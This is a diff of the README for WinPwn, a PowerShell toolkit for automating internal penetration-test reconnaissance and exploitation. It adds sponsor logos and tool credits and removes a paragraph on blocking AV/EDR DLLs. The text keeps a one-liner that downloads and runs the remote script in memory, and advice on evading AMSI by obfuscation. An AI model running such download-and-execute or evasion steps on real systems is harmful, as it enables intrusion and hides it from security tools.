@@ -1,5 +1,10 @@
 [![](https://img.shields.io/badge/Donate-Bitcoin-blue.svg?style=flat)](https://blockchain.info/address/1MXReD1F4w5SUXK3phLVJ5M8KrXJHfecmZ)
 
+# Sponsored by
+
+[<img src="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/images/happy_alp.png" width="300" height="300">](https://www.bluebastion.net/) &emsp; &emsp; &emsp;
+[<img src="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/images/Kovert.png" width="250" height="250">](https://kovert.no/)
+
 # WinPwn
 In many past internal penetration tests I often had problems with the existing Powershell Recon / Exploitation scripts due to missing proxy support. I also often ran the same scripts one after the other to get information about the current system and/or the domain. To automate as many internal penetrationtest processes (reconnaissance as well as exploitation) and for the proxy reason I wrote my own script with automatic proxy recognition and integration. 
 The script is mostly based on well-known large other offensive security Powershell projects.
@@ -12,12 +17,6 @@ Just Import the Modules with:
 `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')`
 
 To bypass AMSI take one of the existing [bypass techniques](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), find the AMSI [trigger](https://github.com/RythmStick/AMSITrigger) and manually change it in the bypass function or encode the trigger string. Alternatively obfuscate the whole script. 
-
-To spawn a new protected PowerShell Process that is set to run with BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON process mitigation:
-
-`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1')`
-
-This prevents non-microsoft DLLs (e.g. AV/EDR products) to load into PowerShell - unless they have a Cross-Signed Microsoft certificate.
 
 If you find yourself stuck on a windows system with no internet access - no problem at all, just use `Offline_Winpwn.ps1`, the most important scripts and executables are included.
 
@@ -184,7 +183,7 @@ Options:
 - [X] [NETSPI](https://github.com/NetSPI/) - PowerUpSQL
 - [X] [Cn33liz](https://github.com/Cn33liz/) - p0wnedShell
 - [X] [rasta-mouse](https://github.com/rasta-mouse/) - AmsiScanBufferBypass
-- [X] [l0ss](https://github.com/l0ss/) - Grouper2
+- [X] [l0ss](https://github.com/l0ss/) - Grouper2,Snaffler,Grouper3
 - [X] [dafthack](https://github.com/dafthack/) - DomainPasswordSpray
 - [X] [enjoiz](https://github.com/enjoiz/Privesc) - PrivEsc
 - [X] [itm4n](https://github.com/itm4n) - Invoke-PrivescCheck & PrintSpoofer
@@ -205,6 +204,10 @@ Options:
 - [X] [cube0x0](https://github.com/cube0x0) - LdapSignCheck + other toolings
 - [X] [@s4ntiago_p](https://twitter.com/s4ntiago_p) - NanoDump
 - [X] [@thefLinkk](https://twitter.com/thefLinkk) - Handlekatz
+- [X] [@Mayyhem](https://github.com/Mayyhem/SharpSCCM) - SharpSCCM
+- [X] [@cube0x0](https://github.com/cube0x0/LdapSignCheck) - LdapSignCheck
+- [X] [@klezVirus](https://github.com/klezVirus/SharpLdapRelayScan) - SharpLdapRelayScan
+- [X] [@HarmJ0y, @leechristensen, @CCob](https://github.com/GhostPack/Certify/) - Certify
 - [X] [Many more people in the Community](https://github.com/search?q=infosec) - I'm sure, that I've forgotten many other invididuals who indirectly contributed into this Script
 
 ## Stargazers over time
